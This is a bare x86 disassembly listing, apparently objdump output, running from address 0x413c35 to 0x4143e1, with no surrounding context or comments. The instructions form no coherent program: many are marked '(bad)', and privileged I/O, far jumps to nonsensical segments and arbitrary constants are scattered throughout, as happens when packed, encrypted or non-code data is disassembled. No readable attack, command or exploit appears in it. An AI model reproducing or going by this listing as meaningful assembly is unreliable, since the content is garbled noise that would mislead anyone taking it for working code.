  413c35:	or     DWORD PTR [edx-0x5d],esp
  413c38:	xchg   esi,eax
  413c39:	mov    dh,0xa9
  413c3b:	mov    ah,0x64
  413c3d:	sub    esi,DWORD PTR [ebx+ebp*4]
  413c40:	out    dx,al
  413c41:	pop    edi
  413c42:	iret   
  413c43:	mov    bh,0x54
  413c45:	loop   0x413c84
  413c47:	cmp    dl,BYTE PTR [ebx-0x61]
  413c4a:	sbb    eax,ecx
  413c4c:	jnp    0x413c99
  413c4e:	aaa    
  413c4f:	cli    
  413c50:	push   es
  413c51:	add    dl,ah
  413c53:	jmp    0xc66e:0x3b0a73f0
  413c5a:	popa   
  413c5b:	(bad)  
  413c5c:	push   edx
  413c5d:	mov    dh,0xf9
  413c5f:	(bad)  
  413c60:	pop    ds
  413c61:	fild   QWORD PTR [ebx-0x39]
  413c64:	cmp    eax,0x177733cb
  413c69:	sti    
  413c6a:	push   di
  413c6c:	jg     0x413c3d
  413c6e:	ret    
  413c6f:	dec    edi
  413c70:	lds    esp,FWORD PTR [edx]
  413c72:	dec    edx
  413c73:	aam    0xc6
  413c75:	(bad)  
  413c76:	scas   eax,DWORD PTR es:[edi]
  413c77:	xchg   edx,eax
  413c78:	adc    bh,dl
  413c7a:	jo     0x413c35
  413c7c:	shr    BYTE PTR [edi+ebp*4+0x615d86d1],cl
  413c83:	not    DWORD PTR [edi]
  413c85:	sub    edx,esi
  413c87:	sbb    al,0x7e
  413c89:	pop    ebx
  413c8a:	push   es
  413c8b:	pop    edi
  413c8c:	iret   
  413c8d:	fdivr  DWORD PTR [eax+0x50c1621]
  413c93:	add    al,0xa
  413c95:	xor    BYTE PTR [edx-0x503411ea],dh
  413c9b:	mov    ?,WORD PTR [eax+ebx*1+0x42c43c4b]
  413ca2:	rcl    BYTE PTR [edi+0x38],cl
  413ca5:	xor    DWORD PTR [esi],esp
  413ca7:	dec    ebp
  413ca8:	xor    BYTE PTR [di+0x12],dl
  413cac:	je     0x413c37
  413cae:	int    0xa6
  413cb0:	imul   ebp,DWORD PTR [edi-0x61794ca6],0xffffff9a
  413cb7:	faddp  st(7),st
  413cb9:	fmulp  st(6),st
  413cbb:	mov    eax,0xbf80ffed
  413cc0:	das    
  413cc1:	loopne 0x413cdb
  413cc3:	sqrtps xmm3,XMMWORD PTR [edi-0x51574d7d]
  413cca:	nop
  413ccb:	cli    
  413ccc:	test   bl,al
  413cce:	imul   ebx,DWORD PTR [eax+0x69],0xffffffd5
  413cd2:	aaa    
  413cd3:	mov    WORD PTR [eax+0x5],ds
  413cd6:	mov    bh,0x8d
  413cd8:	aad    0x93
  413cda:	mov    ds:0xfb2eb787,eax
  413cdf:	jg     0x413d26
  413ce1:	or     al,0x60
  413ce3:	inc    ebx
  413ce4:	dec    esp
  413ce5:	and    eax,0x2e9061bd
  413cea:	push   ss
  413ceb:	cli    
  413cec:	hlt    
  413ced:	push   es
  413cee:	xchg   ecx,eax
  413cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cf0:	mov    al,0xbf
  413cf2:	jle    0x413cad
  413cf4:	jl     0x413d5a
  413cf6:	sbb    DWORD PTR [edx-0x7d],0xffffffb8
  413cfa:	xor    al,0x7c
  413cfc:	xor    bl,BYTE PTR [ebx+0x50]
  413cff:	dec    esi
  413d00:	adc    ch,dh
  413d02:	sub    ch,BYTE PTR [edx+0x58]
  413d05:	neg    BYTE PTR [edi-0x75]
  413d08:	xor    cl,al
  413d0a:	sbb    dl,dh
  413d0c:	jb     0x413cea
  413d0e:	inc    esp
  413d0f:	mov    esp,0x41774c88
  413d14:	popa   
  413d15:	sbb    edi,DWORD PTR [ecx+0x7c2f81ff]
  413d1b:	test   eax,0xbcc67c5f
  413d20:	cmp    edi,edx
  413d22:	call   0x8e0c7e6e
  413d27:	jmp    FWORD PTR [ebx]
  413d29:	pop    ss
  413d2a:	es sahf 
  413d2c:	mov    ch,0x73
  413d2e:	xor    eax,0x6798674e
  413d33:	in     eax,dx
  413d34:	push   edx
  413d35:	jge    0x413d8f
  413d37:	into   
  413d38:	popa   
  413d39:	xchg   al,ch
  413d3b:	ror    BYTE PTR [esp+ebp*8],cl
  413d3e:	data16 adc al,BYTE PTR [esi-0x77]
  413d42:	retf   
  413d43:	sahf   
  413d44:	sbb    al,0xbf
  413d46:	adc    BYTE PTR [eax-0x5e],dh
  413d49:	cmp    DWORD PTR [esi],0x4b
  413d4c:	iret   
  413d4d:	mov    ch,BYTE PTR [eax]
  413d4f:	sar    DWORD PTR [esi-0x355088f3],1
  413d55:	dec    eax
  413d56:	mov    ebx,0x57407066
  413d5b:	je     0x413d6b
  413d5d:	jb     0x413db5
  413d5f:	inc    ebx
  413d60:	into   
  413d61:	mov    eax,0xdecc3b8f
  413d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d67:	aam    0xcf
  413d69:	or     DWORD PTR [eax+0x60],esi
  413d6c:	mov    edx,0xf44ba613
  413d71:	mov    ecx,0x33885fdf
  413d76:	xchg   edi,eax
  413d77:	jae    0x413d89
  413d79:	mov    bh,0xf6
  413d7b:	mov    edx,0xfa262928
  413d80:	inc    esp
  413d81:	xor    al,0x27
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	cwde   
  413d85:	loopne 0x413d59
  413d87:	dec    ecx
  413d88:	ret    0xed8f
  413d8b:	jg     0x413d21
  413d8d:	add    ch,dh
  413d8f:	mov    dl,0x43
  413d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d92:	arpl   si,ax
  413d94:	sbb    dh,ch
  413d96:	jmp    0x1d4586f8
  413d9b:	add    dh,dh
  413d9d:	pextrw ebx,(bad),0xc5
  413d9f:	sbb    BYTE PTR [edx+0xe],ah
  413da2:	push   ecx
  413da3:	ror    cl,0x1f
  413da6:	(bad)  
  413da8:	rol    BYTE PTR [edi+ebx*4-0x27],1
  413dac:	into   
  413dad:	push   ss
  413dae:	inc    esi
  413daf:	stos   DWORD PTR es:[edi],eax
  413db0:	clc    
  413db1:	inc    edi
  413db2:	in     eax,dx
  413db3:	jp     0x413dda
  413db5:	fst    DWORD PTR [eax+0x6f5290e2]
  413dbb:	xchg   ecx,eax
  413dbc:	sub    DWORD PTR [eax-0x30],ebp
  413dbf:	sub    DWORD PTR [ebx],ebp
  413dc1:	mov    dh,0x76
  413dc3:	(bad)  
  413dc4:	dec    edi
  413dc5:	jecxz  0x413e38
  413dc7:	or     al,0xd4
  413dc9:	mov    ah,0xa1
  413dcb:	les    esi,FWORD PTR [esi+0x5fbd311a]
  413dd1:	sbb    BYTE PTR [ebp+ecx*4-0x7],0x12
  413dd6:	fnsave [ecx+0x22]
  413dd9:	sub    ch,BYTE PTR [eax-0xd]
  413ddc:	enter  0x4f81,0x85
  413de0:	psubq  mm1,QWORD PTR [ecx+0x46]
  413de4:	imul   ebp,DWORD PTR [edi+0x10],0x6e
  413de8:	mov    ecx,0xc7e93e61
  413ded:	sub    BYTE PTR [ebp-0x7d7f0319],bh
  413df3:	pop    ebx
  413df4:	push   edi
  413df5:	shl    BYTE PTR [ebx+0x5332205b],1
  413dfb:	mov    bh,0x18
  413dfd:	pop    eax
  413dfe:	mov    ?,WORD PTR [edi+0x28]
  413e01:	ficomp DWORD PTR [eax]
  413e03:	mov    cl,0x2d
  413e05:	inc    ecx
  413e06:	push   edx
  413e07:	fldcw  WORD PTR [esi]
  413e09:	xor    BYTE PTR [edi-0x3a],ch
  413e0c:	adc    DWORD PTR [eax+0xa],edi
  413e0f:	add    BYTE PTR [eax],ch
  413e11:	lahf   
  413e12:	nop
  413e13:	mov    bh,0xd1
  413e15:	jle    0x413da9
  413e17:	dec    ebx
  413e18:	mov    ah,0x9f
  413e1a:	add    BYTE PTR [edx+0x36071bc3],cl
  413e20:	in     eax,0x4
  413e22:	and    al,0x2b
  413e24:	dec    ecx
  413e25:	retf   
  413e26:	std    
  413e27:	jo     0x413e27
  413e29:	jne    0x413e56
  413e2b:	stos   DWORD PTR es:[edi],eax
  413e2c:	and    eax,0x849ff50f
  413e31:	inc    ebp
  413e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e33:	jae    0x413e95
  413e35:	and    DWORD PTR [ebp+0x3b],eax
  413e38:	mov    esp,0xbc1466b1
  413e3d:	jp     0x413e58
  413e3f:	or     BYTE PTR [ebp-0x49],bl
  413e42:	xor    al,0xc0
  413e44:	mov    WORD PTR [esp+ecx*8],?
  413e47:	pop    edi
  413e48:	out    0xec,eax
  413e4a:	(bad)  [ecx-0x5dceec1e]
  413e50:	inc    edi
  413e51:	adc    al,0x0
  413e53:	push   edx
  413e54:	call   0xaafe:0xce47ceda
  413e5b:	(bad)  
  413e5c:	out    0xf7,al
  413e5e:	inc    edi
  413e5f:	test   edx,eax
  413e61:	and    esp,DWORD PTR [ecx-0x45]
  413e64:	push   eax
  413e65:	add    eax,0x522296fc
  413e6a:	arpl   WORD PTR [eax-0x127e381f],ax
  413e70:	and    al,0x6c
  413e72:	xchg   edx,eax
  413e73:	std    
  413e74:	retf   0xd65a
  413e77:	aam    0x51
  413e79:	cmp    al,0xff
  413e7b:	dec    esp
  413e7c:	mov    edx,0x3d8315f4
  413e81:	push   ecx
  413e82:	pop    ebx
  413e83:	adc    DWORD PTR [esp+ecx*1+0x160312a1],0x22
  413e8b:	dec    ebx
  413e8c:	jns    0x413e37
  413e8e:	fcmovnbe st,st(7)
  413e90:	jl     0x413e46
  413e92:	cwde   
  413e93:	loop   0x413eaf
  413e95:	and    bh,BYTE PTR [edx+0x3d]
  413e98:	or     BYTE PTR [edi+0x468dd838],bl
  413e9e:	jecxz  0x413e25
  413ea0:	sbb    BYTE PTR [ecx+esi*8+0x29],bl
  413ea4:	sbb    eax,0xf8040c5e
  413ea9:	push   0xd369cadf
  413eae:	mov    al,ds:0x37867d19
  413eb3:	pop    ss
  413eb4:	cmc    
  413eb5:	loopne 0x413ef4
  413eb7:	test   eax,0x39fec16a
  413ebc:	or     esp,DWORD PTR [ebx+esi*8-0x683314fe]
  413ec3:	int3   
  413ec4:	test   eax,0x4500b339
  413ec9:	jo     0x413e8f
  413ecb:	cli    
  413ecc:	jns    0x413f11
  413ece:	push   eax
  413ecf:	ret    
  413ed0:	dec    edi
  413ed1:	mov    ah,0xd2
  413ed3:	mov    edx,DWORD PTR [eax+0x57]
  413ed6:	sub    al,0x20
  413ed8:	lea    edi,[eax]
  413eda:	sub    ch,dh
  413edc:	rcl    BYTE PTR [edi-0x608ddfef],1
  413ee2:	dec    ecx
  413ee3:	sbb    eax,0xbf887c18
  413ee8:	or     DWORD PTR [edx+0x2],esp
  413eeb:	push   ebp
  413eec:	jno    0x413ee3
  413eee:	xor    edx,DWORD PTR [edx+0x6c]
  413ef1:	inc    ecx
  413ef2:	inc    esi
  413ef3:	xor    dl,BYTE PTR [eax]
  413ef5:	add    al,0x1e
  413ef7:	mov    al,ds:0x3545aba6
  413efc:	test   BYTE PTR [edx],dh
  413efe:	push   cs
  413eff:	cmp    DWORD PTR [edx],ebx
  413f01:	stos   BYTE PTR es:[edi],al
  413f02:	push   es
  413f03:	std    
  413f04:	xchg   BYTE PTR [ecx-0x3e],cl
  413f07:	mov    ebp,0x96118e61
  413f0c:	(bad)  
  413f0e:	and    al,0x7d
  413f10:	pop    eax
  413f11:	lea    ebx,[esi]
  413f13:	jnp    0x413f28
  413f15:	mov    eax,ds:0x35a64b89
  413f1a:	bound  esi,QWORD PTR [ecx-0x5aef60ba]
  413f20:	cmp    al,0xa1
  413f22:	ins    DWORD PTR es:[edi],dx
  413f23:	shl    BYTE PTR [edx+0x7bd51b],cl
  413f29:	jae    0x413f14
  413f2b:	mov    BYTE PTR [ecx],0xce
  413f2e:	mov    eax,ds:0x9eb46560
  413f33:	test   BYTE PTR ds:0x94a86476,0x67
  413f3a:	rcr    DWORD PTR [edx],0xd1
  413f3d:	dec    esi
  413f3e:	sbb    BYTE PTR [edx],0x5d
  413f41:	xor    DWORD PTR [edx+eax*1-0x467de15c],ebx
  413f48:	dec    ebx
  413f49:	shl    al,cl
  413f4b:	cmc    
  413f4c:	mov    eax,ebx
  413f4e:	loop   0x413f63
  413f50:	adc    al,0x64
  413f52:	jmp    0xb474ba66
  413f57:	inc    esi
  413f58:	adc    esp,DWORD PTR [ecx+eiz*4]
  413f5b:	out    dx,al
  413f5c:	out    0x1d,eax
  413f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f5f:	shl    DWORD PTR [ebx],1
  413f61:	stos   BYTE PTR es:[edi],al
  413f62:	mov    eax,0x66262e0
  413f67:	ror    al,cl
  413f69:	add    esp,DWORD PTR [esi]
  413f6b:	add    eax,0x90db99e4
  413f70:	add    DWORD PTR [edi+0x39b9f813],0x67
  413f77:	sub    DWORD PTR [edi-0x14d59ed4],ebp
  413f7d:	cmp    DWORD PTR ds:0xa54536ab,0x7f
  413f84:	dec    ebx
  413f85:	push   esi
  413f86:	push   0xffffffa3
  413f88:	push   ebx
  413f89:	xchg   ecx,eax
  413f8a:	shl    esi,1
  413f8c:	push   edx
  413f8d:	mov    DWORD PTR [eax],0x6b3b88d7
  413f93:	push   0xae309043
  413f98:	jmp    0x634c:0x2d5563a
  413f9f:	adc    al,0x56
  413fa1:	out    0xdc,al
  413fa3:	pop    ds
  413fa4:	jle    0x413f2a
  413fa6:	mov    edi,0x5991600c
  413fab:	ficomp WORD PTR ds:0xf704d698
  413fb1:	imul   ebp,DWORD PTR [esi+0x3e],0x4f2d2e6
  413fb8:	icebp  
  413fb9:	in     al,dx
  413fba:	mov    edx,0x69c41118
  413fbf:	inc    ecx
  413fc0:	xchg   BYTE PTR [esi+0x3c],dh
  413fc3:	shl    DWORD PTR [edx],1
  413fc5:	repnz pop ds
  413fc7:	test   eax,0x6ccb3141
  413fcc:	outs   dx,BYTE PTR ds:[esi]
  413fcd:	stos   DWORD PTR es:[edi],eax
  413fce:	or     ebp,DWORD PTR ds:[edx+0x1d]
  413fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd3:	pusha  
  413fd4:	push   esp
  413fd5:	and    DWORD PTR [ebp+0xaf1277a],esp
  413fdb:	das    
  413fdc:	cdq    
  413fdd:	shl    ch,cl
  413fdf:	rcl    DWORD PTR [ecx+eax*4-0x2083e7e3],cl
  413fe6:	dec    edi
  413fe7:	jbe    0x414017
  413fe9:	(bad)
  413fec:	adc    dl,bl
  413fee:	mov    ebp,0x7ba5fcb9
  413ff3:	lds    esp,FWORD PTR [ecx-0x7c22cbfe]
  413ff9:	stos   BYTE PTR es:[edi],al
  413ffa:	ins    BYTE PTR es:[edi],dx
  413ffb:	jns    0x413fcb
  413ffd:	(bad)
  414000:	jno    0x414002
  414002:	div    BYTE PTR [esp+esi*2-0x3e]
  414006:	jb     0x414086
  414008:	nop
  414009:	dec    eax
  41400a:	mov    bl,0x96
  41400c:	int    0x4b
  41400e:	cmp    eax,0x923db338
  414013:	mov    dl,0xd4
  414015:	jns    0x41404b
  414017:	mov    edx,0x215270c
  41401c:	loop   0x413fe2
  41401e:	sbb    BYTE PTR [eax-0x25690ca2],al
  414024:	(bad)  
  414025:	call   FWORD PTR [esi+0x56]
  414028:	push   edi
  414029:	popa   
  41402a:	je     0x414082
  41402c:	jl     0x414024
  41402e:	fistp  WORD PTR [ecx+0x5]
  414031:	cmc    
  414032:	out    dx,eax
  414033:	pushf  
  414034:	mov    ebx,0xe2d925a8
  414039:	xor    esi,DWORD PTR [ebx]
  41403b:	sti    
  41403c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41403d:	dec    ecx
  41403e:	push   edi
  41403f:	pop    ecx
  414040:	test   BYTE PTR ds:0xe4533118,ah
  414046:	push   ebp
  414047:	mov    al,ds:0xd47fd643
  41404c:	fwait
  41404d:	dec    esi
  41404e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41404f:	cmp    eax,0x8d2bd061
  414054:	int    0x17
  414056:	(bad)  
  414057:	mov    bl,0x53
  414059:	jmp    0x806d:0xc966b144
  414060:	mov    esi,0xdb8dbdf6
  414065:	pusha  
  414066:	stc    
  414067:	inc    ebp
  414068:	jnp    0x41409d
  41406a:	je     0x4140b2
  41406c:	pop    edi
  41406d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41406e:	and    DWORD PTR [esi],edi
  414070:	cmp    BYTE PTR [edi-0x3020ff1d],bh
  414076:	cmp    al,0x7f
  414078:	add    BYTE PTR [esp+ecx*4+0x514bf8f1],dl
  41407f:	xchg   edi,edx
  414081:	dec    esp
  414082:	(bad)  [ebx+0x21]
  414086:	rol    BYTE PTR [ecx+0x1c847d18],0x1c
  41408d:	(bad)  
  41408e:	int    0xe2
  414090:	stos   DWORD PTR es:[edi],eax
  414091:	push   ebx
  414092:	stos   BYTE PTR es:[edi],al
  414093:	sbb    al,0x8c
  414095:	retf   
  414096:	out    0x5,al
  414098:	adc    DWORD PTR [ecx],ebx
  41409a:	retf   0x8b26
  41409d:	mov    bl,0x7a
  41409f:	fidiv  WORD PTR [esi-0x41606534]
  4140a5:	mov    ecx,0xb4d2f574
  4140aa:	or     DWORD PTR [ebp+0x5c],edx
  4140ad:	in     eax,dx
  4140ae:	std    
  4140af:	sbb    BYTE PTR [edx],dl
  4140b1:	jae    0x414043
  4140b3:	popa   
  4140b4:	jnp    0x414130
  4140b6:	(bad)  
  4140b7:	and    BYTE PTR [ebp-0x737f404c],ah
  4140bd:	sti    
  4140be:	jmp    0x4140c8
  4140c0:	or     cl,bl
  4140c2:	inc    DWORD PTR [ebp-0x72749e3]
  4140c8:	cmp    al,0x7b
  4140ca:	stc    
  4140cb:	fcmovnb st,st(2)
  4140cd:	sub    ebp,DWORD PTR [ecx-0x74aecac7]
  4140d3:	or     eax,0x974b3ee1
  4140d8:	jnp    0x4140a9
  4140da:	sbb    DWORD PTR [ebx-0x1eb85434],0xffffffc3
  4140e1:	sbb    esp,DWORD PTR [ebp-0x71]
  4140e4:	(bad)  
  4140e5:	not    DWORD PTR [esi]
  4140e7:	sub    DWORD PTR [esi-0x5fe2ac30],ecx
  4140ed:	popf   
  4140ee:	push   esp
  4140ef:	jnp    0x414120
  4140f1:	add    BYTE PTR [ebp-0x5bf04fae],dh
  4140f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f8:	(bad)  
  4140f9:	mov    edx,DWORD PTR [edx-0x415ef153]
  4140ff:	aam    0x3a
  414101:	xchg   eax,esp
  414103:	cdq    
  414104:	dec    eax
  414105:	mov    es:0xde569da8,al
  41410b:	add    cl,BYTE PTR [eax-0x2d]
  41410e:	popf   
  41410f:	cld    
  414110:	inc    ebp
  414111:	retf   0x2942
  414114:	xchg   DWORD PTR [ecx+ebp*1-0x7e],edi
  414118:	xlat   BYTE PTR ds:[ebx]
  414119:	in     al,0x3
  41411b:	push   ebx
  41411c:	mov    eax,ds:0x50c20d94
  414121:	call   0xbb90:0x6bd73858
  414128:	cmc    
  414129:	(bad)  
  41412a:	fs jle 0x41414d
  41412d:	jp     0x41413c
  41412f:	push   ss
  414130:	mov    ch,0x7b
  414132:	mov    bh,0x0
  414134:	push   ecx
  414135:	idiv   dl
  414137:	call   FWORD PTR [edi-0x36]
  41413a:	mov    esi,0x1a22f2ec
  41413f:	mov    eax,0x2ee8859c
  414144:	gs sbb al,0x89
  414147:	dec    bp
  414149:	(bad)  
  41414a:	pop    esp
  41414b:	mov    edi,0xe6e3fdad
  414150:	push   0x37
  414152:	jp     0x4141ca
  414154:	sub    DWORD PTR [edi-0x6f],esi
  414157:	addr16 mov ch,0x3
  41415a:	pop    ebp
  41415b:	mov    edx,0x3f8fd591
  414160:	in     eax,0x6d
  414162:	and    edx,eax
  414164:	pop    esi
  414165:	jmp    0xa913:0xb1a0a8fd
  41416c:	std    
  41416d:	jecxz  0x4141e0
  41416f:	mov    edx,0x121ea179
  414174:	scas   eax,DWORD PTR es:[edi]
  414175:	cmp    BYTE PTR [edi+eax*4+0x46],dh
  414179:	sbb    edi,DWORD PTR [ecx+0x46]
  41417c:	push   ebx
  41417d:	arpl   dx,ax
  41417f:	cmp    DWORD PTR [ebx*2+0x657335b7],ecx
  414186:	in     al,0xad
  414188:	jl     0x414185
  41418a:	inc    DWORD PTR [esi+0x2f]
  41418d:	xchg   edx,eax
  41418e:	pushf  
  41418f:	addr16 pusha 
  414191:	int3   
  414192:	cmp    al,0x62
  414194:	jns    0x4141f4
  414196:	sar    esp,cl
  414198:	out    0xe1,eax
  41419a:	inc    edi
  41419b:	adc    al,ch
  41419d:	add    eax,0x4570f2c4
  4141a2:	xchg   ebp,eax
  4141a3:	add    BYTE PTR [eax+0x22],dl
  4141a6:	cdq    
  4141a7:	aas    
  4141a8:	xchg   ecx,eax
  4141a9:	ins    BYTE PTR es:[edi],dx
  4141aa:	cld    
  4141ab:	mov    edx,0x32f7469a
  4141b0:	iret   
  4141b1:	loopne 0x41419d
  4141b3:	xchg   edi,eax
  4141b4:	in     eax,dx
  4141b5:	mov    edx,0x278c97c8
  4141ba:	and    al,0x2
  4141bc:	test   DWORD PTR [ecx+0x1a],edi
  4141bf:	sbb    esp,DWORD PTR [edi]
  4141c1:	push   eax
  4141c2:	jmp    0xaddb:0xe71a4f2
  4141c9:	(bad)  
  4141ca:	mov    ch,0xca
  4141cc:	hlt    
  4141cd:	loope  0x414214
  4141cf:	or     al,BYTE PTR [edx]
  4141d1:	nop
  4141d2:	(bad)  
  4141d3:	out    dx,eax
  4141d4:	mov    DWORD PTR [ebx-0x5034eaf3],esi
  4141da:	xor    al,0x82
  4141dc:	stos   DWORD PTR es:[edi],eax
  4141dd:	add    DWORD PTR [ebx],ebx
  4141df:	pop    esi
  4141e0:	popa   
  4141e1:	outs   dx,BYTE PTR ds:[esi]
  4141e2:	xchg   esi,eax
  4141e3:	sub    al,0xcc
  4141e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e6:	dec    eax
  4141e7:	fadd   QWORD PTR [edx-0x69ae3ac1]
  4141ed:	aaa    
  4141ee:	inc    ebx
  4141ef:	scas   eax,DWORD PTR es:[edi]
  4141f0:	push   edx
  4141f1:	rcl    DWORD PTR [edi+0x43],cl
  4141f4:	push   0xffffffcb
  4141f6:	cli    
  4141f7:	neg    DWORD PTR [edx]
  4141f9:	(bad)  
  4141fa:	fcmovnb st,st(0)
  4141fc:	nop
  4141fd:	push   edx
  4141fe:	cmp    ah,bh
  414200:	cld    
  414201:	lock popf 
  414203:	das    
  414204:	scas   al,BYTE PTR es:[edi]
  414205:	jne    0x414208
  414207:	inc    esi
  414208:	shr    BYTE PTR [edi+ebx*4-0x5fed078d],1
  41420f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414210:	or     dl,BYTE PTR [edi+0x18]
  414213:	(bad)  
  414214:	hlt    
  414215:	retf   0xa49
  414218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414219:	add    al,0xae
  41421b:	test   eax,0x3d7e40ea
  414220:	fdivr  QWORD PTR gs:[esi-0x6f]
  414224:	push   edi
  414225:	dec    esp
  414226:	sbb    cl,ch
  414228:	call   0x89ca:0x71d6c172
  41422f:	sub    esi,DWORD PTR [ebp-0x7b57f4c8]
  414235:	int3   
  414236:	test   eax,0xae522fd
  41423b:	pop    edx
  41423c:	repnz ficom WORD PTR [esi+0x15]
  414240:	ins    DWORD PTR es:[edi],dx
  414241:	sar    BYTE PTR [edi],0x84
  414244:	lods   eax,DWORD PTR ds:[esi]
  414245:	mov    dl,0xfa
  414247:	js     0x41422a
  414249:	sbb    bl,bh
  41424b:	pushf  
  41424c:	outs   dx,DWORD PTR ds:[esi]
  41424d:	retf   
  41424e:	mov    ah,0xf0
  414250:	mov    eax,DWORD PTR [esi+ecx*2]
  414253:	xor    eax,0x93215641
  414258:	sahf   
  414259:	push   esp
  41425a:	push   edx
  41425b:	mov    ch,0x2c
  41425d:	or     DWORD PTR [ebp-0x7c000fbb],esp
  414263:	mov    al,0x53
  414265:	lods   al,BYTE PTR ds:[esi]
  414266:	pusha  
  414267:	clc    
  414268:	popa   
  414269:	adc    eax,0x4a1c7565
  41426e:	enter  0xc971,0x2b
  414272:	jnp    0x41425b
  414274:	jae    0x414208
  414276:	fisttp DWORD PTR [ecx]
  414278:	in     eax,0xf
  41427a:	cdq    
  41427b:	jb     0x4142c1
  41427d:	test   eax,0xcae0518
  414282:	xchg   ebp,eax
  414283:	cmp    al,0xdf
  414285:	lds    edx,FWORD PTR [ebx+0x32]
  414288:	cmp    BYTE PTR [ebp+0x6b],0xf2
  41428c:	mov    DWORD PTR [esi+0x70],ebx
  41428f:	daa    
  414290:	dec    eax
  414291:	sbb    al,0xb3
  414293:	sub    BYTE PTR [esi+0x5f7e8adf],cl
  414299:	ror    cl,cl
  41429b:	lahf   
  41429c:	and    al,0x7f
  41429e:	or     bl,BYTE PTR [ebp+0xb0b6cac]
  4142a4:	aad    0x54
  4142a6:	int    0x4d
  4142a8:	push   ebx
  4142a9:	mov    ds:0x8684c01e,eax
  4142ae:	fcomp  DWORD PTR [eax]
  4142b0:	ins    DWORD PTR es:[edi],dx
  4142b1:	stos   BYTE PTR es:[edi],al
  4142b2:	pop    es
  4142b3:	lahf   
  4142b4:	ss pop ebp
  4142b6:	jmp    0x5410:0xf581054c
  4142bd:	jp     0x414251
  4142bf:	sub    ecx,DWORD PTR [eax-0x43]
  4142c2:	ins    DWORD PTR es:[edi],dx
  4142c3:	pushf  
  4142c4:	sub    eax,0x9123bf97
  4142c9:	fdivr  DWORD PTR [ecx-0x6bf30e47]
  4142cf:	icebp  
  4142d0:	(bad)  
  4142d1:	ja     0x414307
  4142d3:	pop    eax
  4142d4:	fistp  DWORD PTR [ebx]
  4142d6:	add    BYTE PTR [edi],bh
  4142d8:	jnp    0x4142db
  4142da:	dec    ecx
  4142db:	mov    dh,BYTE PTR [esi+0x6644fb2d]
  4142e1:	addr16 jge 0x414298
  4142e4:	pop    ds
  4142e5:	push   ebx
  4142e6:	loop   0x414367
  4142e8:	and    ebx,DWORD PTR [eax-0x4391d958]
  4142ee:	ficomp WORD PTR [ebp+0x2b]
  4142f1:	in     eax,0xf0
  4142f3:	sbb    edi,esi
  4142f5:	out    dx,eax
  4142f6:	push   esp
  4142f7:	add    DWORD PTR [edx],0xad1ae776
  4142fd:	xchg   esp,eax
  4142fe:	jmp    0xe11d9885
  414303:	mov    bl,0xa7
  414305:	dec    eax
  414306:	call   0x88cc:0x40ea8e7a
  41430d:	xchg   esi,eax
  41430e:	arpl   WORD PTR [ebp-0x6],bx
  414311:	mov    edi,0x269046ec
  414316:	shl    dh,0x1
  414319:	pusha  
  41431a:	jns    0x414357
  41431c:	dec    ebx
  41431d:	inc    edi
  41431e:	cmp    eax,0x41b869b
  414323:	ret    
  414324:	ins    BYTE PTR es:[edi],dx
  414325:	adc    eax,0xb4d039e9
  41432a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41432b:	es jnp 0x4142ca
  41432e:	fiadd  DWORD PTR [ecx-0x4cfaddf0]
  414334:	popf   
  414335:	push   ds
  414336:	mov    edi,0x45093154
  41433b:	loopne 0x4142c7
  41433d:	icebp  
  41433e:	and    BYTE PTR [eax+0x6227532c],dh
  414344:	fcom   DWORD PTR [edx+0x1ffb6cf5]
  41434a:	xchg   edi,eax
  41434b:	jle    0x41431d
  41434d:	add    ch,ah
  41434f:	loopne 0x414346
  414351:	rcr    BYTE PTR [eax+0x49],0xa9
  414355:	dec    esp
  414356:	icebp  
  414357:	(bad)  
  41435a:	sbb    ah,BYTE PTR [edi]
  41435c:	clc    
  41435d:	ds cs jmp 0xcccab08e
  414364:	push   esi
  414365:	and    edi,DWORD PTR [edi+0x4d80d9e0]
  41436b:	dec    edi
  41436c:	jb     0x41438d
  41436e:	or     al,0x2c
  414370:	push   cs
  414371:	inc    esi
  414372:	or     DWORD PTR [eax+0x16],esi
  414375:	push   ebp
  414376:	sbb    eax,0xef8f1183
  41437b:	pop    ds
  41437c:	fwait
  41437d:	int3   
  41437e:	aaa    
  41437f:	xchg   ecx,eax
  414380:	jnp    0x4143e6
  414382:	xor    dl,ch
  414384:	push   0xffffffd8
  414386:	pop    edx
  414387:	or     DWORD PTR [esi],esp
  414389:	sbb    al,0xf6
  41438c:	dec    ecx
  41438d:	jmp    0x4143c9
  41438f:	pusha  
  414390:	mov    esi,0x193525b6
  414395:	imul   ecx,DWORD PTR [esi-0x77eb5aeb],0x1a
  41439c:	shl    DWORD PTR [esi+eiz*2],cl
  41439f:	lods   eax,DWORD PTR ds:[esi]
  4143a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a1:	(bad)  
  4143a2:	or     ch,dh
  4143a4:	and    eax,ebx
  4143a6:	ror    BYTE PTR [esi+ebx*4],1
  4143a9:	stos   DWORD PTR es:[edi],eax
  4143aa:	and    DWORD PTR [edi-0x69],edi
  4143ad:	xchg   edx,eax
  4143ae:	jns    0x4143bd
  4143b0:	add    dl,BYTE PTR [edx+0x6d2de0b0]
  4143b6:	cld    
  4143b7:	mov    al,ds:0xc6756ecc
  4143bc:	pslld  mm7,QWORD PTR [edi+edx*1+0x7c]
  4143c1:	inc    ebx
  4143c2:	lahf   
  4143c3:	pop    eax
  4143c4:	xchg   ecx,eax
  4143c5:	popf   
  4143c6:	add    BYTE PTR [esp+ebp*8+0x4edb6e13],0x34
  4143ce:	(bad)  
  4143cf:	mov    edi,0x697a6cbf
  4143d4:	sub    al,0x26
  4143d6:	js     0x4143c6
  4143d8:	out    0x65,eax
  4143da:	mov    edx,0x5703dcf3
  4143df:	push   0x6e
  4143e1:	cwde   
